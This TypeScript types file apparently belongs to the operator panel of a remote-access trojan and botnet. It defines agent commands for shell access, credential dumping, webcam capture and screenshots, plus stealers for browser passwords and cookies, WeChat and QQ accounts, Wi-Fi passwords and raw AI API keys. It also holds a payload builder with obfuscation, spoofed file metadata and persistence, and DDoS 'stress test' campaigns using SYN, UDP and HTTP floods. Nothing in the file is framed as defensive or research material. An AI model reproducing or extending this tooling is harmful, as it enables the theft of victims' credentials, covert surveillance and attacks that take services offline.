export type AgentStatus = 'Online' | 'Offline' | 'Sleeping' | 'Compromised';
export type TaskStatus = 'Pending' | 'Sent' | 'Running' | 'Completed' | 'Failed' | 'Cancelled';
export type UserRole = 'Operator' | 'Admin';
export type CommandType = 'Shell' | 'PowerShell' | 'CredDump' | 'LocalAccounts' | 'Upload' | 'Download' | 'Screenshot' | 'Webcam' | 'WifiScan' | 'Kill' | 'Sleep' | 'Proxy';

export interface GeoInfo {
  publicIp: string;
  region: string;
  isp: string;
  asn: string;
  llc: string;
  latitude: number;
  longitude: number;
}

export interface AgentListItem {
  id: string;
  hostname: string;
  userName: string;
  ipAddress: string;
  osVersion: string;
  status: AgentStatus;
  lastSeen: string;
  geo?: GeoInfo;
}

export interface CpuInfo {
  name: string;
  physicalCores: number;
  logicalCores: number;
  maxClockMHz: number;
}

export interface GpuInfo {
  name: string;
  driverVersion?: string;
  vramBytes?: number;
}

export interface DiskInfo {
  model: string;
  sizeBytes: number;
  mediaType?: string;
  serialNumber?: string;
}

export interface RamInfo {
  totalBytes: number;
}

export interface DisplayInfo {
  name: string;
  width: number;
  height: number;
}

export interface HardwareInfo {
  cpu?: CpuInfo;
  gpus: GpuInfo[];
  disks: DiskInfo[];
  ram?: RamInfo;
  displays: DisplayInfo[];
  motherboardVendor?: string;
  biosVersion?: string;
}

export interface AgentDetail extends AgentListItem {
  arch: string;
  userName: string;
  processName: string;
  pid: number;
  isElevated: boolean;
  hwid?: string;
  firstSeen: string;
  heartbeatInterval: number;
  hardware?: HardwareInfo;
  metadata: Record<string, string>;
}

export interface AgentTask {
  id: string;
  agentId: string;
  createdBy: string;
  commandType: CommandType;
  command: string;
  arguments?: string[];
  status: TaskStatus;
  output?: string;
  error?: string;
  createdAt: string;
  dispatchedAt?: string;
  completedAt?: string;
  timeoutSeconds: number;
}

export interface TaskCreateRequest {
  agentId: string;
  commandType: CommandType;
  command: string;
  arguments?: string[];
  timeoutSeconds?: number;
}

export interface LoginRequest {
  username: string;
  password: string;
}

export interface SetupRequest {
  username: string;
  password: string;
  confirmPassword: string;
}

export interface LoginResponse {
  token: string;
  refreshToken: string;
  expiresAt: string;
  username: string;
  role: UserRole;
}

export interface AuditLog {
  id: string;
  timestamp: string;
  userId: string;
  userName: string;
  action: string;
  targetAgentId?: string;
  details?: string;
  ipAddress: string;
  success: boolean;
}

export interface WsMessage {
  type: string;
  channel: string;
  data: unknown;
  ts: number;
  rid?: string;
}

export interface PagedResponse<T> {
  items: T[];
  total: number;
  page: number;
  pageSize: number;
}

export interface TrafficRecord {
  id: string;
  agentId: string;
  hostname: string;
  bytesSent: number;
  bytesReceived: number;
  timestamp: string;
}

export interface AuditLogEntry {
  id: string;
  timestamp: string;
  userId: string;
  userName: string;
  action: string;
  targetAgentId?: string;
  details?: string;
  ipAddress: string;
  success: boolean;
}

// ── System Info types ────────────────────────────────────────────────

export interface ProcessItem {
  pid: number;
  name: string;
  startTime: string;
  cpuMs: number;
  memoryBytes: number;
  threadCount: number;
}

export interface ProcessListResult {
  changed: boolean;
  hash?: string;
  processes?: ProcessItem[];
}

export interface WindowItem {
  hwnd: number;
  title: string;
  processId: number;
  processName: string;
  className: string;
}

export interface WindowListResult {
  windows: WindowItem[];
  supported: boolean;
}

export interface EnvVar {
  name: string;
  value: string;
}

export interface EnvVarsResult {
  system: EnvVar[];
  user: EnvVar[];
}

export interface NetworkInterface {
  name: string;
  type: string;
  mac: string;
  speed: number;
  ipv4: string[];
  ipv6: string[];
}

export interface WanInfo {
  publicIp: string;
  gateway: string;
  region: string;
  isp: string;
  asn: string;
  llc: string;
  latitude: number;
  longitude: number;
}

export interface WifiProfile {
  ssid: string;
  password: string;
}

export interface NearbyWifiNetwork {
  ssid: string;
  auth: string;
  encryption: string;
  bssid: string;
  signal: string;
}

export interface ProxyInfo {
  enabled: boolean;
  server: string;
  port: number;
  bypass: string;
}

export interface NetworkResult {
  interfaces: NetworkInterface[];
  wan: WanInfo;
  wifi: WifiProfile[];
  nearbyWifi: NearbyWifiNetwork[];
  proxy: ProxyInfo;
  dnsSuffix: string;
}

export interface LanDevice {
  ip: string;
  mac: string;
  hostname: string;
  source: string;
}

export interface LanScanResult {
  devices: LanDevice[];
  subnets: string[];
}

// ── Software Data types ─────────────────────────────────────────────

export interface WeChatAccount {
  wxid: string;
  fileDirs: string[];
  path: string;
}

export interface WeChatResult {
  accounts: WeChatAccount[];
}

export interface QQAccount {
  number: string;
  path: string;
}

export interface QQResult {
  accounts: QQAccount[];
}

export interface QQPortrait {
  avatar: string;
  nickname: string;
}

// ── Browser Stealer types ────────────────────────────────────────────

export interface BrowserPassword {
  browser: string;
  profile: string;
  url: string;
  username: string;
  password: string;
}

export interface BrowserCookie {
  browser: string;
  profile: string;
  host: string;
  name: string;
  value: string;
  path: string;
  expires: number;
}

export interface BrowserHistory {
  browser: string;
  profile: string;
  url: string;
  title: string;
  visits: number;
  lastVisit: number;
}

export type BrowserDataType = 'passwords' | 'cookies' | 'history';

export interface BrowserPagedResult<T> {
  total: number;
  offset: number;
  limit: number;
  items: T[];
  errors: string[];
}

// ── AI Token Scanner types ─────────────────────────────────────────────

export interface AITokenEntry {
  vendor: string;
  source: string;      // 'config-file' | 'env-var'
  path: string;        // file path or env var name
  keyName: string;     // key field name
  keyValue: string;    // raw key value
}

export interface AITokenResult {
  total: number;
  items: AITokenEntry[];
  error?: string;
}

// ── Proxy Browser types ──────────────────────────────────────────────

export interface ProxyResponse {
  status: number;
  statusText: string;
  headers: Record<string, string[]>;
  body: string;
  contentType: string;
  url: string;
  error?: string;
}

// ── Builder types ──────────────────────────────────────────────────────

export interface BuildConfigRequest {
  platform: string;
  applicationType: string;
  serverHost: string;
  serverPort: number;
  enableObfuscation: boolean;
  injectJunkData: boolean;
  junkDataMb: number;
  iconUrl?: string;
  companyName?: string;
  fileDescription?: string;
  productName?: string;
  copyright?: string;
  fileVersion?: string;
  trimUnused: boolean;
  requireAdmin: boolean;
  copyToAppData: boolean;
  enablePersistence: boolean;
}

export type BuildStatus = 'building' | 'completed' | 'failed';

export interface BuildRecord {
  id: string;
  platform: string;
  fileName: string;
  fileSize: number;
  status: BuildStatus;
  error?: string;
  createdAt: string;
  completedAt?: string;
}

export interface BuildRecordDetail extends BuildRecord {
  config: BuildConfigRequest;
}

export interface ProxyHistoryEntry {
  url: string;
  title: string;
  method: string;
  body?: string;
  headers?: string;
}

export interface LocalAccount {
  Name: string;
  FullName?: string;
  Description?: string;
  Enabled: boolean;
  isAdmin: boolean;
  sidValue: string;
  groups: string[];
  PasswordRequired?: boolean;
  UserMayChangePassword?: boolean;
  LastLogon?: string;
  AccountExpires?: string;
  PasswordLastSet?: string;
  PasswordExpires?: string;
  ObjectClass?: string;
  PrincipalSource?: number;
}

export interface LocalAccountsResult {
  accounts: LocalAccount[];
  error?: string;
}

// ── Stress Test (DDoS) types ──────────────────────────────────────────

export type CampaignStatus = 'Running' | 'Stopped' | 'Completed' | 'Failed';

export type StressMethod = 'httpFlood' | 'synFlood' | 'udpFlood' | 'icmpFlood' | 'slowloris' | 'tcpConnFlood' | 'reflection' | 'malformed';

export interface StressStartRequest {
  name: string;
  targetHost: string;
  targetPort: number;
  methods: StressMethod[];
  agentIds: string[];
  durationSeconds: number;
  continueAfterClose: boolean;
  threadsPerAgent: number;
  packetSize: number;
}

export interface StressTestCampaign {
  id: string;
  name: string;
  targetHost: string;
  targetPort: number;
  methods: StressMethod[];
  agentIds: string[];
  durationSeconds: number;
  continueAfterClose: boolean;
  threadsPerAgent: number;
  packetSize: number;
  createdBy: string;
  createdAt: string;
  status: CampaignStatus;
}

export interface StressAgentStatus {
  agentId: string;
  hostname: string;
  packetsSent: number;
  bytesSent: number;
  connectionsOpen: number;
  mbps: number;
  lastReport: string;
}

export interface StressCampaignDetail {
  campaign: StressTestCampaign;
  agentStatuses: StressAgentStatus[];
}
